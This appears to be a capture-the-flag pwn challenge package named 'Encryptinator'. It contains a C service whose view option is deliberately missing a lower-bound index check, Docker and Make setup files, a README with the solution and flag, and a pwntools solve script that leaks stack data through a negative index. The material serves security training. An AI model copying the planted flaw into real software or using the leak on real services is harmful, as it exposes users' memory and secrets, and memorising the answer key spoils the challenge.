{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n",
    "encryptinator.c": "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <string.h>\n\n#define MAX_LEN 1024\n#define FLAG_LEN 30\n\nvoid upkeep() {\n    // Not related to the challenge, just some stuff so the remote works correctly\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n}\n\nvoid print_hex(char* buf, int len) {\n    for (int i=0; i<len; i++) {\n        printf(\"%02x\", (unsigned char)buf[i]);\n    }\n    printf(\"\\n\");\n}\n\nvoid encrypt(char* msg, int len, char* iv) {\n    char key[len];\n    FILE *file;\n    \n    file = fopen(\"/dev/urandom\", \"rb\");\n    fread(key, len, 1, file);\n    fclose(file);    \n\n    for (int i=0; i<len; i++) {\n        msg[i] = msg[i] ^ key[i] ^ iv[i % 8];\n    }\n}\n\nvoid randomize(char* msg, int len, unsigned long seed, unsigned long iterations) {\n    seed = seed * iterations + len;\n\n    if (iterations > 1) {\n        randomize(msg, len, seed, iterations- 1);\n    } else {\n        encrypt(msg, len, ((char *) &seed));\n    }\n}\n\nchar menu() {\n    char option;\n    printf(\"\\nSelect from the options below:\\n\");\n    printf(\"1. Encrypt a message\\n\");\n    printf(\"2. View the encrypted message\\n\");\n    printf(\"3. Quit\\n\");\n    printf(\"> \");\n    scanf(\"%c\", &option);\n    while (getchar() != '\\n');\n    return option;\n}\n\nvoid console() {\n    FILE* file;\n    long seed;\n    int index;\n    int read_len;\n    char buf[MAX_LEN] = \"\";\n    int len = -1;\n\n    while (1) {\n        switch(menu()) {\n            case '1':\n                // get user input\n                printf(\"\\nPlease enter message to encrypt: \");\n                fgets(buf, MAX_LEN-FLAG_LEN, stdin);\n                len = strlen(buf);\n\n                // add flag to the buffer\n                file = fopen(\"flag.txt\", \"rb\");\n                fread(buf + len, FLAG_LEN, 1, file);\n                fclose(file);\n                len += FLAG_LEN;\n\n                // encrypt\n                seed = ((long) rand()) << 32 + rand();\n                randomize(buf, len, seed, buf[0]);\n                break;\n            case '2':\n                if(len == -1) {\n                    printf(\"Sorry, you need to encrypt a message first.\\n\");\n                    break;\n                }\n\n                index = 0;\n                printf(\"\\nRead a substring of the encrypted message.\");\n                printf(\"\\nPlease enter the starting index (%d - %d): \", index, len);\n                scanf(\"%d\", &index);\n                while (getchar() != '\\n');\n\n                if (index > len) { \n                    printf(\"Error, index out of bounds.\\n\");\n                    break;\n                }\n\n                printf(\"Here's your encrypted string with the flag:\\n\");\n                print_hex(buf+index, len - index);\n                break;\n            case '3':\n                printf(\"goodbye.\\n\");\n                exit(0);\n            default:\n                printf(\"There was an error processing that request, please try again.\\n\");\n                break;\n        }\n    }\n\n}\n\n\nint main() {\n    srand(time(NULL)); \n    upkeep();\n\n    // welcome\n    printf(\"Welcome to my encryption engine: ENCRYPT-INATOR!\\n\");\n    printf(\"I'll encrypt anything you want but no guarantees you'll be able to decrypt it,\\n\");\n    printf(\"I haven't quite figured out how to do that yet... :(\\n\"); \n    console();\n}\n",
    "flag.txt": "gigem{00ps_b4d_3rr0r_ch3ck1ng}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -w\nNAME := encryptinator\nPORT := 9001\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\tdocker rm -f $(NAME)\n\tdocker rmi $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c \n\n.PHONY:\n",
    "README.md": "# Encryptinator\n\nAuthor: `_mac_`\n\nI have made this super secure encryption engine. I'll encrypt any message and no one will ever be able to read it. Not even me!\n\n## Dev Notes\nGiven files: `encryptinator.c` and `encryptinator`\n\n**Setup:**\n```\nsudo make docker\nsudo make run\n```\n\n\nBy default `encryptinator` is running on port 9001\n\n**Cleanup:**\n```\nsudo make clean\n```\n\n## Solution\nThe vulnerability is that the check on viewing the encrypted message only checks if the index is after, but not before, so we can provide negative values to leak information from the stack.\n\nThe idea is to encrypt, then when we \"view the encrypted message,\" we can provide a negative value to leak the key used to encrypt, then we can use that to decrypt the flag.\n\nSee `solve.py` for details\n\nFlag: `gigem{00ps_b4d_3rr0r_ch3ck1ng}`\n",
    "solve.py": "from pwn import *\nfrom Crypto.Util.number import long_to_bytes\n\nexe = ELF('encryptinator')\ncontext.binary = exe\n\n#r = process()\n#gdb.attach(r, gdbscript='b *encrypt')\n\nr = remote('localhost', 9001)\n\nr.sendline(b'1')\nr.sendline(b'AAAA')\nr.sendline(b'2')\nr.sendline(b'-1000000')\n\nr.recvuntil(b'flag:\\n')\nkeyspace = long_to_bytes(int(r.recvline().strip(), 16))\n\nr.sendline(b'2')\nr.sendline(b'0')\nr.recvuntil(b'flag:\\n')\nflag_ct = long_to_bytes(int(r.recvline().strip(), 16))\n\n#iv = long_to_bytes(0x6893ab48f939318e)\niv = long_to_bytes(0x6893ab48f939318e)[::-1]\n\nprint(len(keyspace))\nprint(len(flag_ct))\nprint(len(iv))\n\nfor i in range(len(keyspace)-35):\n    temp = xor(xor(keyspace[i:i+35], flag_ct), iv)\n    if b'gigem' in temp:\n        print(temp)\n\n",
    "category": "pwn"
}